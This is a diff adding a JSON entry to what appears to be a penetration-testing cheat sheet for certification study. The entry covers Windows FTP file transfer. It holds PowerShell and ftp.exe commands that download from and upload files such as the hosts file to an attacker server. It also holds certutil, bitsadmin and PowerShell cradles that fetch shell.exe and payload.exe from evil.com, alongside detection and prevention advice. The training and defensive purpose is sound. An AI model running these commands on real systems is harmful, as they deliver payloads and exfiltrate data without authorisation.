@@ -1,0 +1,103 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "ftp"
+  ],
+  "tools": [
+    "ftp",
+    "powershell"
+  ],
+  "tags": [
+    "windows",
+    "ftp"
+  ],
+  "category": "File Transfers",
+  "subcategory": "Windows Transfer",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "Download over FTP with PowerShell",
+      "command": "(New-Object Net.WebClient).DownloadFile('ftp://10.10.14.12/file.txt','C:\\Users\\Public\\ftp-file.txt')"
+    }
+  ],
+  "notes": "Host an FTP server on the attacker: sudo pip3 install pyftpdlib; sudo python3 -m pyftpdlib --port 21 [--write].",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "win-ps-download",
+      "rel": "alternative",
+      "note": "PowerShell cradle."
+    },
+    {
+      "id": "win-smb-transfer",
+      "rel": "alternative",
+      "note": "SMB share transfer."
+    },
+    {
+      "id": "win-upload",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "win-ftp-transfer",
+  "name": "Windows - FTP Transfer",
+  "command": "(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt','C:\\Users\\Public\\ftp-file.txt')",
+  "description": "Transfer over FTP with PowerShell's WebClient, or script the built-in ftp.exe client with a command file (the non-interactive ftp -s: method for constrained shells).",
+  "variations": [
+    {
+      "label": "PowerShell FTP download",
+      "command": "(New-Object Net.WebClient).DownloadFile('ftp://<lhost>/file.txt','C:\\Users\\Public\\ftp-file.txt')"
+    },
+    {
+      "label": "PowerShell FTP upload",
+      "command": "(New-Object Net.WebClient).UploadFile('ftp://<lhost>/ftp-hosts','C:\\Windows\\System32\\drivers\\etc\\hosts')"
+    },
+    {
+      "label": "ftp.exe script - download",
+      "command": "echo open <lhost> > ftpcommand.txt\necho USER anonymous >> ftpcommand.txt\necho binary >> ftpcommand.txt\necho GET file.txt >> ftpcommand.txt\necho bye >> ftpcommand.txt\nftp -v -n -s:ftpcommand.txt"
+    },
+    {
+      "label": "ftp.exe script - upload",
+      "command": "echo open <lhost> > ftpcommand.txt\necho USER anonymous >> ftpcommand.txt\necho binary >> ftpcommand.txt\necho PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt\necho bye >> ftpcommand.txt\nftp -v -n -s:ftpcommand.txt"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "The Windows FTP client transfers files to/from an attacker FTP server, often scripted with -s:ftpcommand.txt. Useful when other channels are blocked - but FTP is plaintext and uses port 21, which is frequently filtered outbound.",
+    "prerequisites": "Code execution on Windows, an attacker FTP server, and outbound FTP (port 21) permitted.",
+    "impact": "Files transferred over FTP; the module scenario notes 21 is often blocked, so this is a fallback channel.",
+    "detection": "Outbound FTP (21) to an external host is uncommon in modern networks and easily flagged; the plaintext control channel exposes commands/credentials to inspection; ftp.exe command line and the ftpcommand.txt script file are logged.",
+    "artifacts": "An FTP control connection on 21 to the attacker; ftp.exe in process logs; a dropped ftpcommand.txt; the transferred file.",
+    "prevention": "[MITRE T1105 M1037 Filter Network Traffic] Use web content filtering to block risky file types (.exe) and whitelist domains (the module scenario shows GitHub/Dropbox/Drive blocked); [M1031 Network Intrusion Prevention] inspect and block transfers at IDS/IPS. Apply application control (WDAC/AppLocker) to block download cradles/LOLBins, and AV/EDR to catch known tooling.",
+    "evasion": "Only viable where 21 egresses; there is little to hide since FTP is plaintext - encrypt files beforehand so intercepted data is unreadable.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  }
+}
